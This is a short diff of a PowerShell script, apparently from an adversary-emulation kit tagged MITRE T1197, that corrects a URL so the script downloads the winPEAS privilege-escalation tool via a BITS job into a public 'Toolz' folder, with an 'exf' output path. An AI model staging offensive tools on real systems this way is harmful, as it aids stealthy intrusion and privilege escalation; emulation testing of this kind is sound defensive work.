@@ -6,7 +6,7 @@ Write-Output "BITS Job : Donwload WINPEAS using Bitsadmin (T1197)"
 Write-Output "==============================================================================="
 #
 $exf_file ="$env:PUBLIC\exf\Bits_WinPEAS.txt"; 
-$DownLoadSource = "hhttps://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+$DownLoadSource = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
 $DestDir = "$env:PUBLIC\Toolz\"
 $DestFile = "winPEASany_ofs.exe"
 $FullDest = $DestDir + $DestFile
